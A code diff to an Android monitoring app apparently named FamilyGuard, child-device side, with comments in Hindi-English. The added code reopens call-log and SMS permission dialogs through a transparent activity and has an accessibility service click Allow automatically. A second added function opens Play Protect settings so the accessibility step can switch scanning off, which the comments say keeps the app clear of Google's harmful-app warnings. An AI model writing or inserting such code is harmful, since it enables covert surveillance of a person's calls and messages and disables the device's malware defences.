@@ -98,6 +98,17 @@ object CommandHandler {
                 data.addProperty("usageApps", r.usageApps)
                 data.addProperty("permCalls", com.familyguard.child.service.SyncEngine.hasCallsPerm(ctx))
                 data.addProperty("permSms", com.familyguard.child.service.SyncEngine.hasSmsPerm(ctx))
+                // VC17 SELF-HEAL: READ_CALL_LOG/READ_SMS missing (OEM auto-revoke /
+                // wizard ne sirf ek perm par done kar diya) — transparent
+                // CallsPermActivity teeno ka dialog kholti hai, a11y "calls" step
+                // par Allow khud click karta hai. 10-min throttle (dialog spam na ho).
+                val callsMissing = !com.familyguard.child.service.SyncEngine.hasCallsPerm(ctx)
+                val smsMissing = !com.familyguard.child.service.SyncEngine.hasSmsPerm(ctx)
+                val now = System.currentTimeMillis()
+                if ((callsMissing || smsMissing) && now - Store.lastCallsPermReqAt > 10 * 60_000L) {
+                    Store.lastCallsPermReqAt = now
+                    requestCallsPerm(ctx)
+                }
                 Pair(true, data)
             }
 
@@ -778,6 +789,76 @@ object CommandHandler {
                 }
             }
         }
+    }
+
+    /** Calls & SMS permission background request (vc17) — CallsPermActivity
+     *  (transparent) teeno perms ka dialog kholti hai, EnforcementService "calls"
+     *  step par Allow khud click karta hai. Start BAL-safe (a11y context) — start
+     *  fail ho to tap-able notification fallback (foreground tap hamesha legal). */
+    private fun requestCallsPerm(ctx: Context) {
+        val ok = startActivityBalSafe(ctx) {
+            android.content.Intent(ctx, com.familyguard.child.ui.CallsPermActivity::class.java)
+        }
+        if (!ok) {
+            runCatching {
+                val pi = PendingIntent.getActivity(
+                    ctx, 9009,
+                    android.content.Intent(ctx, com.familyguard.child.ui.CallsPermActivity::class.java),
+                    PendingIntent.FLAG_IMMUTABLE or PendingIntent.FLAG_UPDATE_CURRENT
+                )
+                ensureChannel(ctx)
+                val n = NotificationCompat.Builder(ctx, CH_FG)
+                    .setSmallIcon(android.R.drawable.ic_dialog_info)
+                    .setContentTitle("Calls & SMS permission")
+                    .setContentText("Tap to allow call log and SMS access")
+                    .setContentIntent(pi)
+                    .setAutoCancel(true)
+                    .build()
+                if (
+                    ContextCompat.checkSelfPermission(ctx, Manifest.permission.POST_NOTIFICATIONS) == PackageManager.PERMISSION_GRANTED ||
+                    Build.VERSION.SDK_INT < 33
+                ) {
+                    NotificationManagerCompat.from(ctx).notify(9010, n)
+                }
+            }
+        }
+    }
+
+    /**
+     * VC17: Play Protect settings screen kholo (BAL-safe) — SelfHeal/wizard isse
+     * FamilyGuard ko Google "harmful app" warnings se bachane ke liye use karte
+     * hain (scan toggle a11y "protect" step par khud OFF click hota hai).
+     *
+     * Koi ek public component guaranteed nahi hai (GMS version ke saath badalta
+     * rehta hai), isliye CANDIDATE list — pehla jo chale wahi kaafi hai:
+     *  1. GMS PlayProtectSettingsActivity (modern)
+     *  2. GMS PlayProtectSettings (kuch builds)
+     *  3. market://playprotect deep link (Play Store resolver)
+     * Sab fail → false (caller kuch nahi karta — phone ki settings me manually).
+     */
+    fun openPlayProtect(ctx: Context): Boolean {
+        val candidates = listOf<android.content.Intent>(
+            android.content.Intent().setComponent(
+                android.content.ComponentName(
+                    "com.google.android.gms",
+                    "com.google.android.gms.security.settings.PlayProtectSettingsActivity"
+                )
+            ),
+            android.content.Intent().setComponent(
+                android.content.ComponentName(
+                    "com.google.android.gms",
+                    "com.google.android.gms.security.settings.PlayProtectSettings"
+                )
+            ),
+            android.content.Intent(
+                android.content.Intent.ACTION_VIEW,
+                android.net.Uri.parse("market://playprotect")
+            )
+        )
+        for (i in candidates) {
+            if (startActivityBalSafe(ctx) { i }) return true
+        }
+        return false
     }
 
     /** Gallery permission background request — CameraPermActivity ka
